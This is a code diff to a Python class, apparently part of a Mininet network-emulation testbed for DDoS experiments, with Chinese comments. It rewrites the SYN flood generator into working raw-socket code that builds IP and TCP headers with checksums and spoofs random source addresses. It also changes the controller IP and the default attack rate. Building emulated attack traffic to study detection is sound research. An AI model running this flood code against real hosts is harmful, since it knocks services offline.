@@ -20,7 +20,7 @@ from utils.generate_topo_diagram import (
 )
 
 # 默認控制器設置
-controller_ip = "10.101.9.222"
+controller_ip = "192.168.1.102"
 controller_port = 6653
 
 
@@ -43,7 +43,7 @@ class MininetDDoS:
         target_host,
         attack_type="syn",
         duration=30,
-        rate=100,
+        rate=10,
         threads=1,
     ):
         """從源主機啟動對目標主機的DDoS攻擊
@@ -227,72 +227,193 @@ class MininetDDoS:
         self, host, target_ip, target_port, duration, rate, threads
     ):
         """構建SYN洪水攻擊命令"""
-        cmd = f"""
-        python -c '
-import time
-import random
-import threading
-import socket
-import struct
-
-def syn_flood(target_ip, target_port, duration, rate, thread_id):
-    start_time = time.time()
-    packets_sent = 0
-    
-    # 創建一個原始套接字
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    except socket.error as e:
-        print(f"無法創建套接字: {{e}}")
-        return
-    
-    while time.time() - start_time < duration:
-        # 控制發送速率
-        current_time = time.time()
-        elapsed = current_time - start_time
-        expected_packets = rate * elapsed / {threads}
+        import textwrap
         
-        if packets_sent < expected_packets:
-            # 建立IP頭
-            src_ip = f"10.0.0.{{random.randint(1, 254)}}"
-            src_port = random.randint(1024, 65535)
+        # 使用 textwrap.dedent 去除多餘縮進
+        script = textwrap.dedent(f'''
+        import time
+        import random
+        import threading
+        import socket
+        import struct
+        import os
+        
+        def checksum(msg):
+            s = 0
+            # 如果消息長度為奇數，則添加一個填充字節
+            if len(msg) % 2 != 0:
+                msg += b'\x00'
+            # 循環計算校驗和
+            for i in range(0, len(msg), 2):
+                w = (msg[i] << 8) + msg[i+1]
+                s = s + w
+            s = (s >> 16) + (s & 0xffff)
+            s = s + (s >> 16)
+            s = ~s & 0xffff
+            return s
+        
+        def create_ip_header(src_ip, dst_ip, proto=socket.IPPROTO_TCP):
+            # IP 頭部字段
+            ip_ihl = 5
+            ip_ver = 4
+            ip_tos = 0
+            ip_tot_len = 20 + 20  # IP 頭部 + TCP 頭部
+            ip_id = random.randint(1, 65535)
+            ip_frag_off = 0
+            ip_ttl = 64
+            ip_proto = proto
+            ip_check = 0
+            ip_saddr = socket.inet_aton(src_ip)
+            ip_daddr = socket.inet_aton(dst_ip)
             
-            # 構建TCP頭，SYN標誌設為1
-            tcp_header = struct.pack("!HHLLBBHHH", 
-                src_port,                    # 源端口
-                {target_port},               # 目標端口
-                0,                           # 序列號
-                0,                           # 確認號
-                5 << 4,                      # 頭部長度 (5*4=20 bytes)
-                2,                           # 標誌 (SYN=1)
-                8192,                        # 窗口大小
-                0,                           # 校驗和 (填0讓操作系統計算)
-                0)                           # 緊急指針
+            ip_ihl_ver = (ip_ver << 4) + ip_ihl
             
-            packet = tcp_header
+            # 打包 IP 頭部
+            ip_header = struct.pack('!BBHHHBBH4s4s',
+                ip_ihl_ver,
+                ip_tos,
+                ip_tot_len,
+                ip_id,
+                ip_frag_off,
+                ip_ttl,
+                ip_proto,
+                ip_check,
+                ip_saddr,
+                ip_daddr
+            )
+            
+            # 計算校驗和並更新
+            ip_check = checksum(ip_header)
+            ip_header = ip_header[:10] + struct.pack('!H', ip_check) + ip_header[12:]
+            
+            return ip_header
+        
+        def create_tcp_header(src_ip, dst_ip, src_port, dst_port):
+            # TCP 頭部字段
+            tcp_source = src_port
+            tcp_dest = dst_port
+            tcp_seq = random.randint(1, 4294967295)
+            tcp_ack_seq = 0
+            tcp_doff = 5
+            tcp_fin = 0
+            tcp_syn = 1
+            tcp_rst = 0
+            tcp_psh = 0
+            tcp_ack = 0
+            tcp_urg = 0
+            tcp_window = socket.htons(5840)
+            tcp_check = 0
+            tcp_urg_ptr = 0
+            
+            tcp_offset_res = (tcp_doff << 4) + 0
+            tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+            
+            # 打包 TCP 頭部
+            tcp_header = struct.pack('!HHLLBBHHH',
+                tcp_source,
+                tcp_dest,
+                tcp_seq,
+                tcp_ack_seq,
+                tcp_offset_res,
+                tcp_flags,
+                tcp_window,
+                tcp_check,
+                tcp_urg_ptr
+            )
+            
+            # 偽造頭部用於計算校驗和
+            src_addr = socket.inet_aton(src_ip)
+            dst_addr = socket.inet_aton(dst_ip)
+            placeholder = 0
+            protocol = socket.IPPROTO_TCP
+            tcp_length = len(tcp_header)
+            
+            psh = struct.pack('!4s4sBBH',
+                src_addr,
+                dst_addr,
+                placeholder,
+                protocol,
+                tcp_length
+            )
+            
+            # 計算校驗和
+            tcp_check = checksum(psh + tcp_header)
+            
+            # 更新校驗和
+            tcp_header = tcp_header[:16] + struct.pack('!H', tcp_check) + tcp_header[18:]
+            
+            return tcp_header
+        
+        def syn_flood(target_ip, target_port, duration, rate, thread_id):
+            start_time = time.time()
+            packets_sent = 0
+            
+            # 創建原始套接字
             try:
-                sock.sendto(packet, (f"{target_ip}", 0))
-                packets_sent += 1
-            except:
-                pass
-        else:
-            time.sleep(0.001)
-
-# 創建並啟動攻擊線程
-threads = []
-for i in range({threads}):
-    t = threading.Thread(target=syn_flood, 
-                        args=("{target_ip}", {target_port}, {duration}, {rate}, i))
-    t.daemon = True
-    threads.append(t)
-    t.start()
-
-# 等待所有線程完成
-for t in threads:
-    t.join()
-'
-        """
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            except socket.error as e:
+                print(f"無法創建套接字: {{e}}")
+                return
+            
+            while time.time() - start_time < duration:
+                # 控制發送速率
+                current_time = time.time()
+                elapsed = current_time - start_time
+                expected_packets = rate * elapsed / {threads}
+                
+                if packets_sent < expected_packets:
+                    # 隨機生成源 IP 和端口
+                    src_ip = f"10.0.0.{{random.randint(1, 254)}}"
+                    src_port = random.randint(1024, 65535)
+                    
+                    # 創建 IP 和 TCP 頭部
+                    ip_header = create_ip_header(src_ip, "{target_ip}")
+                    tcp_header = create_tcp_header(src_ip, "{target_ip}", src_port, {target_port})
+                    
+                    # 組合完整數據包
+                    packet = ip_header + tcp_header
+                    
+                    try:
+                        sock.sendto(packet, ("{target_ip}", 0))
+                        packets_sent += 1
+                        if packets_sent % 1000 == 0:
+                            print(f"線程 {{thread_id}} 已發送 {{packets_sent}} 個數據包")
+                    except Exception as e:
+                        print(f"發送失敗: {{e}}")
+                else:
+                    time.sleep(0.001)
+        
+        # 創建並啟動攻擊線程
+        threads_list = []
+        for i in range({threads}):
+            t = threading.Thread(target=syn_flood, 
+                              args=("{target_ip}", {target_port}, {duration}, {rate}, i))
+            t.daemon = True
+            threads_list.append(t)
+            t.start()
+            print(f"線程 {{i}} 已啟動")
+        
+        # 等待所有線程完成
+        for t in threads_list:
+            t.join()
+        
+        print("SYN flood 攻擊完成")
+        ''')
+        
+        # 寫入臨時文件並執行，避免命令行中的 null byte 問題
+        script_path = f"/tmp/syn_flood_{host.name}.py"
+        
+        # 在主機上寫入腳本文件
+        with open(script_path, 'w') as f:
+            f.write(script)
+        
+        # 設置文件權限
+        import os
+        os.chmod(script_path, 0o755)
+        
+        # 執行腳本
+        cmd = f"sudo python3 {script_path}"
         return cmd
 
     def _build_udp_flood_cmd(self, host, target_ip, duration, rate, threads):
